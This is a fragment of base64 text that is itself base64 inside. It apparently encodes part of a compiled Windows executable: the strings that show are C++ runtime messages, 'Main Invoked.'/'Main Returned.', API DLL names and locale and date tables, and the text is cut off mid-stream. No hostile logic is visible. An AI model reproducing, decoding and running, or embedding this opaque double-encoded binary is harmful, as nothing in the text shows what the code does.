QUFBQVJpb0NBQUFBQUFCU0tnSUFBQUFBQUY0cUFnQUFBQUFBZUNvQ0FBQUFBQUNTS2dJQUFBQUFBS1FxQWdBQUFBQUF0aW9DQUFBQUFBRElLZ0lBQUFBQUFOb3FBZ0FBQUFBQTdpb0NBQUFBQUFENktnSUFBQUFBQUFBQUFBQUFBQUFBRmdBQUFBQUFBSUFWQUFBQUFBQUFnQThBQUFBQUFBQ0FFQUFBQUFBQUFJQWFBQUFBQUFBQWdKc0JBQUFBQUFDQUNRQUFBQUFBQUlBSUFBQUFBQUFBZ0FZQUFBQUFBQUNBQWdBQUFBQUFBSUFBQUFBQUFBQUFBS2dtQWdBQUFBQUFsaVlDQUFBQUFBQUFBQUFBQUFBQUFDUXlBSUFCQUFBQXdDc0JnQUVBQUFBQUFBQUFBQUFBQU9BUkFJQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSmhtQUlBQkFBQUFaQTBCZ0FFQUFBRFFJQUdBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCMHZ3Q0FBUUFBQUhRYUFZQUJBQUFBekdjQWdBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXNEb0NnQUVBQUFCUU93S0FBUUFBQU1nSkFvQUJBQUFBNUNnQWdBRUFBQUJvS1FDQUFRQUFBRlZ1YTI1dmQyNGdaWGhqWlhCMGFXOXVBQUFBQUFBQUFFQUtBb0FCQUFBQTVDZ0FnQUVBQUFCb0tRQ0FBUUFBQUdKaFpDQmhiR3h2WTJGMGFXOXVBQURBQ2dLQUFRQUFBT1FvQUlBQkFBQUFhQ2tBZ0FFQUFBQmlZV1FnWVhKeVlYa2dibVYzSUd4bGJtZDBhQUFBQUFCSUN3S0FBUUFBQUNnd0FJQUJBQUFBY0RRQWdBRUFBQUFFTlFDQUFRQUFBTUFMQW9BQkFBQUE1Q2dBZ0FFQUFBQm9LUUNBQVFBQUFHSmhaQ0JsZUdObGNIUnBiMjRBQUFCUU1BS0FBUUFBQUFBQUFBQUFBQUFBVFdGcGJpQkpiblp2YTJWa0xnQUFBRTFoYVc0Z1VtVjBkWEp1WldRdUFBQUFBQUFBQUFBQUFHTnpiZUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBSUFXVEdRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXBBQUNBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUEFBQUFBQUFBQUNBRmt4a0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFGaEZBWUFCQUFBQWNFVUJnQUVBQUFDd1JRR0FBUUFBQVBCRkFZQUJBQUFBWVFCa0FIWUFZUUJ3QUdrQU13QXlBQUFBQUFBQUFBQUFZUUJ3QUdrQUxRQnRBSE1BTFFCM0FHa0FiZ0F0QUdNQWJ3QnlBR1VBTFFCbUFHa0FZZ0JsQUhJQWN3QXRBR3dBTVFBdEFERUFMUUF4QUFBQUFBQUFBR0VBY0FCcEFDMEFiUUJ6QUMwQWR3QnBBRzRBTFFCakFHOEFjZ0JsQUMwQWN3QjVBRzRBWXdCb0FDMEFiQUF4QUMwQU1nQXRBREFBQUFBQUFBQUFBQUJyQUdVQWNnQnVBR1VBYkFBekFESUFBQUFBQUFBQUFBQkZkbVZ1ZEZKbFoybHpkR1Z5QUFBQUFBQUFBQUFBQUFCRmRtVnVkRk5sZEVsdVptOXliV0YwYVc5dUFBQUFBQUJGZG1WdWRGVnVjbVZuYVhOMFpYSUFBQUFBQUFBQUFBQkZkbVZ1ZEZkeWFYUmxWSEpoYm5ObVpYSUFBQUFBQUFBQkFBQUFBd0FBQUVac2MwRnNiRzlqQUFBQUFBQUFBQUFCQUFBQUF3QUFBRVpzYzBaeVpXVUFBUUFBQUFNQUFBQkdiSE5IWlhSV1lXeDFaUUFBQUFBQUFRQUFBQU1BQUFCR2JITlRaWFJXWVd4MVpRQUFBQUFBQWdBQUFBTUFBQUJKYm1sMGFXRnNhWHBsUTNKcGRHbGpZV3hUWldOMGFXOXVSWGdBTFFBQUFDc0FBQUFtQUFBQUxUNHFBQzhBQUFBbEFBQUFQQUFBQUR3OUFBQStBQUFBUGowQUFDd0FBQUFvS1FBQWZnQUFBRjRBQUFCOEFBQUFKaVlBQUh4OEFBQXFQUUFBS3owQUFDMDlBQUF2UFFBQUpUMEFBRDQrUFFBOFBEMEFKajBBQUh3OUFBQmVQUUFBWUhabWRHRmliR1VuQUFBQUFBQUFBR0IyWW5SaFlteGxKd0FBQUFBQUFBQmdkbU5oYkd3bkFHQjBlWEJsYjJZbkFBQUFBQUFBQUFCZ2JHOWpZV3dnYzNSaGRHbGpJR2QxWVhKa0p3QUFBQUJnYzNSeWFXNW5Kd0FBQUFBQUFBQUFZSFppWVhObElHUmxjM1J5ZFdOMGIzSW5BQUFBQUFBQVlIWmxZM1J2Y2lCa1pXeGxkR2x1WnlCa1pYTjBjblZqZEc5eUp3QUFBQUJnWkdWbVlYVnNkQ0JqYjI1emRISjFZM1J2Y2lCamJHOXpkWEpsSndBQUFHQnpZMkZzWVhJZ1pHVnNaWFJwYm1jZ1pHVnpkSEoxWTNSdmNpY0FBQUFBWUhabFkzUnZjaUJqYjI1emRISjFZM1J2Y2lCcGRHVnlZWFJ2Y2ljQUFBQmdkbVZqZEc5eUlHUmxjM1J5ZFdOMGIzSWdhWFJsY21GMGIzSW5BQUFBQUdCMlpXTjBiM0lnZG1KaGMyVWdZMjl1YzNSeWRXTjBiM0lnYVhSbGNtRjBiM0luQUFBQUFBQmdkbWx5ZEhWaGJDQmthWE53YkdGalpXMWxiblFnYldGd0p3QUFBQUFBQUdCbGFDQjJaV04wYjNJZ1kyOXVjM1J5ZFdOMGIzSWdhWFJsY21GMGIzSW5BQUFBQUFBQUFBQmdaV2dnZG1WamRHOXlJR1JsYzNSeWRXTjBiM0lnYVhSbGNtRjBiM0luQUdCbGFDQjJaV04wYjNJZ2RtSmhjMlVnWTI5dWMzUnlkV04wYjNJZ2FYUmxjbUYwYjNJbkFBQmdZMjl3ZVNCamIyNXpkSEoxWTNSdmNpQmpiRzl6ZFhKbEp3QUFBQUFBQUdCMVpIUWdjbVYwZFhKdWFXNW5Kd0JnUlVnQVlGSlVWRWtBQUFBQUFBQUFZR3h2WTJGc0lIWm1kR0ZpYkdVbkFHQnNiMk5oYkNCMlpuUmhZbXhsSUdOdmJuTjBjblZqZEc5eUlHTnNiM04xY21VbkFDQnVaWGRiWFFBQUFBQUFBQ0JrWld4bGRHVmJYUUFBQUFBQUFBQmdiMjF1YVNCallXeHNjMmxuSndBQVlIQnNZV05sYldWdWRDQmtaV3hsZEdVZ1kyeHZjM1Z5WlNjQUFBQUFBQUJnY0d4aFkyVnRaVzUwSUdSbGJHVjBaVnRkSUdOc2IzTjFjbVVuQUFBQUFHQnRZVzVoWjJWa0lIWmxZM1J2Y2lCamIyNXpkSEoxWTNSdmNpQnBkR1Z5WVhSdmNpY0FBQUJnYldGdVlXZGxaQ0IyWldOMGIzSWdaR1Z6ZEhKMVkzUnZjaUJwZEdWeVlYUnZjaWNBQUFBQVlHVm9JSFpsWTNSdmNpQmpiM0I1SUdOdmJuTjBjblZqZEc5eUlHbDBaWEpoZEc5eUp3QUFBR0JsYUNCMlpXTjBiM0lnZG1KaGMyVWdZMjl3ZVNCamIyNXpkSEoxWTNSdmNpQnBkR1Z5WVhSdmNpY0FBQUFBQUdCa2VXNWhiV2xqSUdsdWFYUnBZV3hwZW1WeUlHWnZjaUFuQUFBQUFBQUFZR1I1Ym1GdGFXTWdZWFJsZUdsMElHUmxjM1J5ZFdOMGIzSWdabTl5SUNjQUFBQUFBQUFBQUdCMlpXTjBiM0lnWTI5d2VTQmpiMjV6ZEhKMVkzUnZjaUJwZEdWeVlYUnZjaWNBQUFBQUFBQmdkbVZqZEc5eUlIWmlZWE5sSUdOdmNIa2dZMjl1YzNSeWRXTjBiM0lnYVhSbGNtRjBiM0luQUFBQUFBQUFBQUJnYldGdVlXZGxaQ0IyWldOMGIzSWdZMjl3ZVNCamIyNXpkSEoxWTNSdmNpQnBkR1Z5WVhSdmNpY0FBQUFBQUFCZ2JHOWpZV3dnYzNSaGRHbGpJSFJvY21WaFpDQm5kV0Z5WkNjQUFBQUFBRzl3WlhKaGRHOXlJQ0lpSUFBQUFBQUFBQUFBQUFBQUFOaE9BWUFCQUFBQThFNEJnQUVBQUFBUVR3R0FBUUFBQUNoUEFZQUJBQUFBU0U4QmdBRUFBQUFBQUFBQUFBQUFBR2hQQVlBQkFBQUFlRThCZ0FFQUFBQ0FUd0dBQVFBQUFKQlBBWUFCQUFBQW9FOEJnQUVBQUFDd1R3R0FBUUFBQU1CUEFZQUJBQUFBMEU4QmdBRUFBQURjVHdHQUFRQUFBT2hQQVlBQkFBQUE4RThCZ0FFQUFBQUFVQUdBQVFBQUFCQlFBWUFCQUFBQU1FUUJnQUVBQUFBY1VBR0FBUUFBQUNoUUFZQUJBQUFBTUZBQmdBRUFBQUEwVUFHQUFRQUFBRGhRQVlBQkFBQUFQRkFCZ0FFQUFBQkFVQUdBQVFBQUFFUlFBWUFCQUFBQVNGQUJnQUVBQUFCUVVBR0FBUUFBQUZ4UUFZQUJBQUFBWUZBQmdBRUFBQUJrVUFHQUFRQUFBR2hRQVlBQkFBQUE1RVlCZ0FFQUFBRG9SZ0dBQVFBQUFPeEdBWUFCQUFBQThFWUJnQUVBQUFEMFJnR0FBUUFBQVBoR0FZQUJBQUFBL0VZQmdBRUFBQUFBUndHQUFRQUFBQVJIQVlBQkFBQUFDRWNCZ0FFQUFBQU1Sd0dBQVFBQUFCQkhBWUFCQUFBQUZFY0JnQUVBQUFBWVJ3R0FBUUFBQUJ4SEFZQUJBQUFBSUVjQmdBRUFBQUFrUndHQUFRQUFBQ2hIQVlBQkFBQUFMRWNCZ0FFQUFBQXdSd0dBQVFBQUFEUkhBWUFCQUFBQU9FY0JnQUVBQUFBOFJ3R0FBUUFBQUVCSEFZQUJBQUFBUkVjQmdBRUFBQUJJUndHQUFRQUFBRXhIQVlBQkFBQUFVRWNCZ0FFQUFBQmdSd0dBQVFBQUFIQkhBWUFCQUFBQWVFY0JnQUVBQUFDSVJ3R0FBUUFBQUtCSEFZQUJBQUFBc0VjQmdBRUFBQURJUndHQUFRQUFBT2hIQVlBQkFBQUFDRWdCZ0FFQUFBQW9TQUdBQVFBQUFFaElBWUFCQUFBQWFFZ0JnQUVBQUFDUVNBR0FBUUFBQUxCSUFZQUJBQUFBMkVnQmdBRUFBQUQ0U0FHQUFRQUFBQ0JKQVlBQkFBQUFRRWtCZ0FFQUFBQlFTUUdBQVFBQUFGUkpBWUFCQUFBQVlFa0JnQUVBQUFCd1NRR0FBUUFBQUpSSkFZQUJBQUFBb0VrQmdBRUFBQUN3U1FHQUFRQUFBTUJKQVlBQkFBQUE0RWtCZ0FFQUFBQUFTZ0dBQVFBQUFDaEtBWUFCQUFBQVVFb0JnQUVBQUFCNFNnR0FBUUFBQUtoS0FZQUJBQUFBeUVvQmdBRUFBQUR3U2dHQUFRQUFBQmhMQVlBQkFBQUFTRXNCZ0FFQUFBQjRTd0dBQVFBQUFKaExBWUFCQUFBQU1FUUJnQUVBQUFBZ1ZIbHdaU0JFWlhOamNtbHdkRzl5SndBQUFBQUFBQUFnUW1GelpTQkRiR0Z6Y3lCRVpYTmpjbWx3ZEc5eUlHRjBJQ2dBQUFBQUFDQkNZWE5sSUVOc1lYTnpJRUZ5Y21GNUp3QUFBQUFBQUNCRGJHRnpjeUJJYVdWeVlYSmphSGtnUkdWelkzSnBjSFJ2Y2ljQUFBQUFJRU52YlhCc1pYUmxJRTlpYW1WamRDQk1iMk5oZEc5eUp3QUFBQUFBQUFCZlgySmhjMlZrS0FBQUFBQUFBQUFBWDE5alpHVmpiQUJmWDNCaGMyTmhiQUFBQUFBQUFBQUFYMTl6ZEdSallXeHNBQUFBQUFBQUFGOWZkR2hwYzJOaGJHd0FBQUFBQUFCZlgyWmhjM1JqWVd4c0FBQUFBQUFBWDE5MlpXTjBiM0pqWVd4c0FBQUFBRjlmWTJ4eVkyRnNiQUFBQUY5ZlpXRmlhUUFBQUFBQUFGOWZjSFJ5TmpRQVgxOXlaWE4wY21samRBQUFBQUFBQUY5ZmRXNWhiR2xuYm1Wa0FBQUFBQUJ5WlhOMGNtbGpkQ2dBQUFBZ2JtVjNBQUFBQUFBQUFBQWdaR1ZzWlhSbEFEMEFBQUErUGdBQVBEd0FBQ0VBQUFBOVBRQUFJVDBBQUZ0ZEFBQUFBQUFBYjNCbGNtRjBiM0lBQUFBQUxUNEFBQ29BQUFBckt3QUFMUzBBQUFBQUFBQUdBQUFHQUFFQUFCQUFBd1lBQmdJUUJFVkZSUVVGQlFVRk5UQUFVQUFBQUFBb0lEaFFXQWNJQURjd01GZFFCd0FBSUNBSUJ3QUFBQWhnYUdCZ1lHQUFBSGh3ZUhoNGVBZ0hDQWNBQndBSUNBZ0FBQWdIQ0FBSENBQUhBQ2h1ZFd4c0tRQUFBQUFBQUNnQWJnQjFBR3dBYkFBcEFBQUFBQUFBQUFBQUFBQUFBQVVBQU1BTEFBQUFBQUFBQUFBQUFBQWRBQURBQkFBQUFBQUFBQUFBQUFBQWxnQUF3QVFBQUFBQUFBQUFBQUFBQUkwQUFNQUlBQUFBQUFBQUFBQUFBQUNPQUFEQUNBQUFBQUFBQUFBQUFBQUFqd0FBd0FnQUFBQUFBQUFBQUFBQUFKQUFBTUFJQUFBQUFBQUFBQUFBQUFDUkFBREFDQUFBQUFBQUFBQUFBQUFBa2dBQXdBZ0FBQUFBQUFBQUFBQUFBSk1BQU1BSUFBQUFBQUFBQUFBQUFBQzBBZ0RBQ0FBQUFBQUFBQUFBQUFBQXRRSUF3QWdBQUFBQUFBQUFBQUFBQUF3QUFBQUFBQUFBQXdBQUFBQUFBQUFKQUFBQUFBQUFBRU52Y2tWNGFYUlFjbTlqWlhOekFBQUFBQUFBQUFBQUFFU0tBSUFCQUFBQUFBQUFBQUFBQUFDTWlnQ0FBUUFBQUFBQUFBQUFBQUFBK0p3QWdBRUFBQUM0blFDQUFRQUFBUFRNQUlBQkFBQUE5TXdBZ0FFQUFBQzh2d0NBQVFBQUFDREFBSUFCQUFBQXBNd0FnQUVBQUFEQXpBQ0FBUUFBQUFBQUFBQUFBQUFBNElvQWdBRUFBQUJFcndDQUFRQUFBSUN2QUlBQkFBQUFqS0lBZ0FFQUFBRElvZ0NBQVFBQUFNek1BSUFCQUFBQTlNd0FnQUVBQUFCd3h3Q0FBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUQwekFDQUFRQUFBQUFBQUFBQUFBQUE2SW9BZ0FFQUFBRDB6QUNBQVFBQUFIeUtBSUFCQUFBQVdJb0FnQUVBQUFEMHpBQ0FBUUFBQUFFQUFBQVdBQUFBQWdBQUFBSUFBQUFEQUFBQUFnQUFBQVFBQUFBWUFBQUFCUUFBQUEwQUFBQUdBQUFBQ1FBQUFBY0FBQUFNQUFBQUNBQUFBQXdBQUFBSkFBQUFEQUFBQUFvQUFBQUhBQUFBQ3dBQUFBZ0FBQUFNQUFBQUZnQUFBQTBBQUFBV0FBQUFEd0FBQUFJQUFBQVFBQUFBRFFBQUFCRUFBQUFTQUFBQUVnQUFBQUlBQUFBaEFBQUFEUUFBQURVQUFBQUNBQUFBUVFBQUFBMEFBQUJEQUFBQUFnQUFBRkFBQUFBUkFBQUFVZ0FBQUEwQUFBQlRBQUFBRFFBQUFGY0FBQUFXQUFBQVdRQUFBQXNBQUFCc0FBQUFEUUFBQUcwQUFBQWdBQUFBY0FBQUFCd0FBQUJ5QUFBQUNRQUFBQVlBQUFBV0FBQUFnQUFBQUFvQUFBQ0JBQUFBQ2dBQUFJSUFBQUFKQUFBQWd3QUFBQllBQUFDRUFBQUFEUUFBQUpFQUFBQXBBQUFBbmdBQUFBMEFBQUNoQUFBQUFnQUFBS1FBQUFBTEFBQUFwd0FBQUEwQUFBQzNBQUFBRVFBQUFNNEFBQUFDQUFBQTF3QUFBQXNBQUFBWUJ3QUFEQUFBQUFBQUFBQUFBQUFBNEZRQmdBRUFBQUF3VlFHQUFRQUFBSEJGQVlBQkFBQUFjRlVCZ0FFQUFBQ3dWUUdBQVFBQUFBQldBWUFCQUFBQVlGWUJnQUVBQUFDd1ZnR0FBUUFBQUxCRkFZQUJBQUFBOEZZQmdBRUFBQUF3VndHQUFRQUFBSEJYQVlBQkFBQUFzRmNCZ0FFQUFBQUFXQUdBQVFBQUFHQllBWUFCQUFBQXdGZ0JnQUVBQUFBUVdRR0FBUUFBQUZoRkFZQUJBQUFBOEVVQmdBRUFBQUJnV1FHQUFRQUFBR0VBY0FCcEFDMEFiUUJ6QUMwQWR3QnBBRzRBTFFCaEFIQUFjQUJ0QUc4QVpBQmxBR3dBTFFCeUFIVUFiZ0IwQUdrQWJRQmxBQzBBYkFBeEFDMEFNUUF0QURFQUFBQUFBQUFBQUFBQUFBQUFZUUJ3QUdrQUxRQnRBSE1BTFFCM0FHa0FiZ0F0QUdNQWJ3QnlBR1VBTFFCa0FHRUFkQUJsQUhRQWFRQnRBR1VBTFFCc0FERUFMUUF4QUMwQU1RQUFBR0VBY0FCcEFDMEFiUUJ6QUMwQWR3QnBBRzRBTFFCakFHOEFjZ0JsQUMwQVpnQnBBR3dBWlFBdEFHd0FNZ0F0QURFQUxRQXhBQUFBQUFBQUFBQUFBQUJoQUhBQWFRQXRBRzBBY3dBdEFIY0FhUUJ1QUMwQVl3QnZBSElBWlFBdEFHd0Fid0JqQUdFQWJBQnBBSG9BWVFCMEFHa0Fid0J1QUMwQWJBQXhBQzBBTWdBdEFERUFBQUFBQUFBQUFBQUFBR0VBY0FCcEFDMEFiUUJ6QUMwQWR3QnBBRzRBTFFCakFHOEFjZ0JsQUMwQWJBQnZBR01BWVFCc0FHa0FlZ0JoQUhRQWFRQnZBRzRBTFFCdkFHSUFjd0J2QUd3QVpRQjBBR1VBTFFCc0FERUFMUUF5QUMwQU1BQUFBQUFBQUFBQUFHRUFjQUJwQUMwQWJRQnpBQzBBZHdCcEFHNEFMUUJqQUc4QWNnQmxBQzBBY0FCeUFHOEFZd0JsQUhNQWN3QjBBR2dBY2dCbEFHRUFaQUJ6QUMwQWJBQXhBQzBBTVFBdEFESUFBQUFBQUFBQVlRQndBR2tBTFFCdEFITUFMUUIzQUdrQWJnQXRBR01BYndCeUFHVUFMUUJ6QUhRQWNnQnBBRzRBWndBdEFHd0FNUUF0QURFQUxRQXdBQUFBQUFBQUFHRUFjQUJwQUMwQWJRQnpBQzBBZHdCcEFHNEFMUUJqQUc4QWNnQmxBQzBBY3dCNUFITUFhUUJ1QUdZQWJ3QXRBR3dBTVFBdEFESUFMUUF4QUFBQUFBQmhBSEFBYVFBdEFHMEFjd0F0QUhjQWFRQnVBQzBBWXdCdkFISUFaUUF0QUhjQWFRQnVBSElBZEFBdEFHd0FNUUF0QURFQUxRQXdBQUFBQUFBQUFBQUFZUUJ3QUdrQUxRQnRBSE1BTFFCM0FHa0FiZ0F0QUdNQWJ3QnlBR1VBTFFCNEFITUFkQUJoQUhRQVpRQXRBR3dBTWdBdEFERUFMUUF3QUFBQUFBQUFBR0VBY0FCcEFDMEFiUUJ6QUMwQWR3QnBBRzRBTFFCeUFIUUFZd0J2QUhJQVpRQXRBRzRBZEFCMUFITUFaUUJ5QUMwQWR3QnBBRzRBWkFCdkFIY0FMUUJzQURFQUxRQXhBQzBBTUFBQUFBQUFZUUJ3QUdrQUxRQnRBSE1BTFFCM0FHa0FiZ0F0QUhNQVpRQmpBSFVBY2dCcEFIUUFlUUF0QUhNQWVRQnpBSFFBWlFCdEFHWUFkUUJ1QUdNQWRBQnBBRzhBYmdCekFDMEFiQUF4QUMwQU1RQXRBREFBQUFBQUFBQUFBQUFBQUFBQVpRQjRBSFFBTFFCdEFITUFMUUIzQUdrQWJnQXRBR3NBWlFCeUFHNEFaUUJzQURNQU1nQXRBSEFBWVFCakFHc0FZUUJuQUdVQUxRQmpBSFVBY2dCeUFHVUFiZ0IwQUMwQWJBQXhBQzBBTVFBdEFEQUFBQUFBQUFBQUFBQUFBQUFBWlFCNEFIUUFMUUJ0QUhNQUxRQjNBR2tBYmdBdEFHNEFkQUIxQUhNQVpRQnlBQzBBWkFCcEFHRUFiQUJ2QUdjQVlnQnZBSGdBTFFCc0FERUFMUUF4QUMwQU1BQUFBQUFBQUFBQUFBQUFBQUJsQUhnQWRBQXRBRzBBY3dBdEFIY0FhUUJ1QUMwQWJnQjBBSFVBY3dCbEFISUFMUUIzQUdrQWJnQmtBRzhBZHdCekFIUUFZUUIwQUdrQWJ3QnVBQzBBYkFBeEFDMEFNUUF0QURBQUFBQUFBSFVBY3dCbEFISUFNd0F5QUFBQUFBQUNBQUFBRWdBQUFBSUFBQUFTQUFBQUFnQUFBQklBQUFBQ0FBQUFFZ0FBQUFBQUFBQU9BQUFBUjJWMFEzVnljbVZ1ZEZCaFkydGhaMlZKWkFBQUFBQUFDQUFBQUJJQUFBQUVBQUFBRWdBQUFFeERUV0Z3VTNSeWFXNW5SWGdBQUFBRUFBQUFFZ0FBQUV4dlkyRnNaVTVoYldWVWIweERTVVFBQUFBQVNVNUdBR2x1WmdCT1FVNEFibUZ1QUFBQUFBQk9RVTRvVTA1QlRpa0FBQUFBQUFBQWJtRnVLSE51WVc0cEFBQUFBQUFBQUU1QlRpaEpUa1FwQUFBQUFBQUFBQUJ1WVc0b2FXNWtLUUFBQUFCbEt6QXdNQUFBQUFBQUFBQUFBQUFBQUFBQUFCQmRBWUFCQUFBQUZGMEJnQUVBQUFBWVhRR0FBUUFBQUJ4ZEFZQUJBQUFBSUYwQmdBRUFBQUFrWFFHQUFRQUFBQ2hkQVlBQkFBQUFMRjBCZ0FFQUFBQTBYUUdBQVFBQUFFQmRBWUFCQUFBQVNGMEJnQUVBQUFCWVhRR0FBUUFBQUdSZEFZQUJBQUFBY0YwQmdBRUFBQUI4WFFHQUFRQUFBSUJkQVlBQkFBQUFoRjBCZ0FFQUFBQ0lYUUdBQVFBQUFJeGRBWUFCQUFBQWtGMEJnQUVBQUFDVVhRR0FBUUFBQUpoZEFZQUJBQUFBbkYwQmdBRUFBQUNnWFFHQUFRQUFBS1JkQVlBQkFBQUFxRjBCZ0FFQUFBQ3dYUUdBQVFBQUFMaGRBWUFCQUFBQXhGMEJnQUVBQUFETVhRR0FBUUFBQUl4ZEFZQUJBQUFBMUYwQmdBRUFBQURjWFFHQUFRQUFBT1JkQVlBQkFBQUE4RjBCZ0FFQUFBQUFYZ0dBQVFBQUFBaGVBWUFCQUFBQUdGNEJnQUVBQUFBa1hnR0FBUUFBQUNoZUFZQUJBQUFBTUY0QmdBRUFBQUJBWGdHQUFRQUFBRmhlQVlBQkFBQUFBUUFBQUFBQUFBQm9YZ0dBQVFBQUFIQmVBWUFCQUFBQWVGNEJnQUVBQUFDQVhnR0FBUUFBQUloZUFZQUJBQUFBa0Y0QmdBRUFBQUNZWGdHQUFRQUFBS0JlQVlBQkFBQUFzRjRCZ0FFQUFBREFYZ0dBQVFBQUFOQmVBWUFCQUFBQTZGNEJnQUVBQUFBQVh3R0FBUUFBQUJCZkFZQUJBQUFBS0Y4QmdBRUFBQUF3WHdHQUFRQUFBRGhmQVlBQkFBQUFRRjhCZ0FFQUFBQklYd0dBQVFBQUFGQmZBWUFCQUFBQVdGOEJnQUVBQUFCZ1h3R0FBUUFBQUdoZkFZQUJBQUFBY0Y4QmdBRUFBQUI0WHdHQUFRQUFBSUJmQVlBQkFBQUFpRjhCZ0FFQUFBQ1lYd0dBQVFBQUFMQmZBWUFCQUFBQXdGOEJnQUVBQUFCSVh3R0FBUUFBQU5CZkFZQUJBQUFBNEY4QmdBRUFBQUR3WHdHQUFRQUFBQUJnQVlBQkFBQUFHR0FCZ0FFQUFBQW9ZQUdBQVFBQUFFQmdBWUFCQUFBQVZHQUJnQUVBQUFCY1lBR0FBUUFBQUdoZ0FZQUJBQUFBZ0dBQmdBRUFBQUNvWUFHQUFRQUFBTUJnQVlBQkFBQUFVM1Z1QUUxdmJnQlVkV1VBVjJWa0FGUm9kUUJHY21rQVUyRjBBRk4xYm1SaGVRQUFUVzl1WkdGNUFBQUFBQUFBVkhWbGMyUmhlUUJYWldSdVpYTmtZWGtBQUFBQUFBQUFWR2gxY25Oa1lYa0FBQUFBUm5KcFpHRjVBQUFBQUFBQVUyRjBkWEprWVhrQUFBQUFTbUZ1QUVabFlnQk5ZWElBUVhCeUFFMWhlUUJLZFc0QVNuVnNBRUYxWndCVFpYQUFUMk4wQUU1dmRnQkVaV01BQUFBQUFFcGhiblZoY25rQVJtVmljblZoY25rQUFBQUFUV0Z5WTJnQUFBQkJjSEpwYkFBQUFFcDFibVVBQUFBQVNuVnNlUUFBQUFCQmRXZDFjM1FBQUFBQUFBQlRaWEIwWlcxaVpYSUFBQUFBQUFBQVQyTjBiMkpsY2dCT2IzWmxiV0psY2dBQUFBQUFBQUFBUkdWalpXMWlaWElBQUFBQVFVMEFBRkJOQUFBQUFBQUFUVTB2WkdRdmVYa0FBQUFBQUFBQUFHUmtaR1FzSUUxTlRVMGdaR1FzSUhsNWVYa0FBQUFBQUVoSU9tMXRPbk56QUFBQUFBQUFBQUJUQUhVQWJnQUFBRTBBYndCdUFBQUFWQUIxQUdVQUFBQlhBR1VBWkFBQUFGUUFhQUIxQUFBQVJnQnlBR2tBQUFCVEFHRUFkQUFBQUZNQWRRQnVBR1FBWVFCNUFBQUFBQUJOQUc4QWJnQmtBR0VBZVFBQUFBQUFWQUIxQUdVQWN3QmtBR0VBZVFBQUFGY0FaUUJrQUc0QVpRQnpBR1FBWVFCNUFBQUFBQUFBQUZRQWFBQjFBSElBY3dCa0FHRUFlUUFBQUFBQUFBQUFBRVlBY2dCcEFHUUFZUUI1QUFBQUFBQlRBR0VBZEFCMUFISUFaQUJoQUhrQUFBQUFBQUFBQUFCS0FHRUFiZ0FBQUVZQVpRQmlBQUFBVFFCaEFISUFBQUJCQUhBQWNnQUFBRTBBWVFCNUFBQUFTZ0IxQUc0QUFBQktBSFVBYkFBQUFFRUFkUUJuQUFBQVV3QmxBSEFBQUFCUEFHTUFkQUFBQUU0QWJ3QjJBQUFBUkFCbEFHTUFBQUJLQUdFQWJnQjFBR0VBY2dCNUFBQUFSZ0JsQUdJQWNnQjFBR0VBY2dCNUFBQUFBQUFBQUFBQVRRQmhBSElBWXdCb0FBQUFBQUFBQUVFQWNBQnlBR2tBYkFBQUFBQUFBQUJLQUhVQWJnQmxBQUFBQUFBQUFBQUFTZ0IxQUd3QWVRQUFBQUFBQUFBQUFFRUFkUUJuQUhVQWN3QjBBQUFBQUFCVEFHVUFjQUIwQUdVQWJRQmlBR1VBY2dBQUFBQUFBQUJQQUdNQWRBQnZBR0lBWlFCeUFBQUFUZ0J2QUhZQVpRQnRBR0lBWlFCeUFBQUFBQUFBQUFBQVJBQmxBR01BWlFCdEFHSUFaUUJ5QUFBQUFBQkJBRTBBQUFBQUFGQUFUUUFBQUFBQUFBQUFBRTBBVFFBdkFHUUFaQUF2QUhrQWVRQUFBQUFBQUFBQUFHUUFaQUJrQUdRQUxBQWdBRTBBVFFCTkFFMEFJQUJrQUdRQUxBQWdBSGtBZVFCNUFIa0FBQUJJQUVnQU9nQnRBRzBBT2dCekFITUFBQUFBQUFBQUFBQmxBRzRBTFFCVkFGTUFBQUFBQUFBQThHQUJnQUVBQUFBQVlRR0FBUUFBQUJCaEFZQUJBQUFBSUdFQmdBRUFBQUJxQUdFQUxRQktBRkFBQUFBQUFBQUFlZ0JvQUMwQVF3Qk9BQUFBQUFBQUFHc0Fid0F0QUVzQVVnQUFBQUFBQUFCNkFHZ0FMUUJVQUZjQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDZ0FLQUFvQUNnQUtBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQklBQkFBRUFBUUFCQUFFQUFRQUJBQUVBQVFBQkFBRUFBUUFCQUFFQUFRQUlRQWhBQ0VBSVFBaEFDRUFJUUFoQUNFQUlRQUVBQVFBQkFBRUFBUUFCQUFFQUNCQUlFQWdRQ0JBSUVBZ1FBQ